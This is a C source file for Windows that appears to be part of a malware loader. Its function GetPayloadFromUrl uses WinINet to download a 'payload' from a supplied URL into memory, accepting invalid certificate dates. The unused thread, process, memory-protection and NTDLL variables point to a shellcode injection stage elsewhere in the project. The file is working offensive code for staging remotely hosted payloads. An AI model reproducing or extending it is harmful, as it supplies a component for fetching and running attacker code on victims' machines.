//
// Created by cappybara on 19/02/24.
//
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"
#pragma comment (lib, "wininet.lib")





BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

    BOOL		bSTATE = TRUE;
    HINTERNET	hInternet = NULL,
        hInternetFile = NULL;

    DWORD		dwBytesRead = 0;
    SIZE_T		sSize = 0;

    PBYTE pTmpBytes = NULL;

    DWORD       dwOldProt = 0;

    HANDLE      hThread = NULL;

    DWORD dwProcID = 0;
    HANDLE hProcess = NULL;

    PBYTE pBytes = NULL;

    HMODULE hNTDLL = 0;

    
    // Opening the internet session handle, all arguments are NULL here since no proxy options are required
#ifdef DEBUG
    PRINTA("opening a handle to the internet session...\n");
#endif
    hInternet = InternetOpenW(L"Cappy", 0, NULL, NULL, 0);
    if (hInternet == NULL) {
#ifdef DEBUG
        PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
#endif
        bSTATE = FALSE; goto _EndOfFunction;
    }
#ifdef DEBUG
    PRINTA("got a handle!\n");
#endif


    // Opening the handle to the payload using the payload's URL
#ifdef DEBUG
    PRINTA("getting the handle to the payload...\n");
#endif
    hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (hInternetFile == NULL) {
#ifdef DEBUG
        PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
#endif
        bSTATE = FALSE; goto _EndOfFunction;
    }
#ifdef DEBUG
    PRINTA("got a handle!\n");
#endif


    // Allocating 1024 bytes to the temp buffer
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (pTmpBytes == NULL) {
        bSTATE = FALSE; goto _EndOfFunction;
    }

    while (TRUE) {

        // Reading 1024 bytes to the tmp buffer. The function will read less bytes in case the file is less than 1024 bytes.
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
#ifdef DEBUG
            PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
#endif
            bSTATE = FALSE; goto _EndOfFunction;
        }

        // Calculating the total size of the total buffer
        sSize += dwBytesRead;

        // In case the total buffer is not allocated yet
        // then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            // Otherwise, reallocate the pBytes to equal to the total size, sSize.
            // This is required in order to fit the whole payload
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (pBytes == NULL) {
            bSTATE = FALSE; goto _EndOfFunction;
        }

        // Append the temp buffer to the end of the total buffer
        _memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        // Clean up the temp buffer
        memset(pTmpBytes, '\0', dwBytesRead);

        // If less than 1024 bytes were read it means the end of the file was reached
        // Therefore exit the loop
        if (dwBytesRead < 1024) {
            break;
        }

        // Otherwise, read the next 1024 bytes
    }




    //
    //  Save The Values
    //
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

#ifdef DEBUG
    PRINTA("\t[i] Bytes: [0x%p]\n", pBytes);
#endif


_EndOfFunction:
    if (hInternet)
        InternetCloseHandle(hInternet);											// Closing handle
    if (hInternetFile)
        InternetCloseHandle(hInternetFile);										// Closing handle
    if (hInternet)
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);	// Closing Wininet connection
    if (pTmpBytes)
        LocalFree(pTmpBytes);													// Freeing the temp buffer
    return bSTATE;
}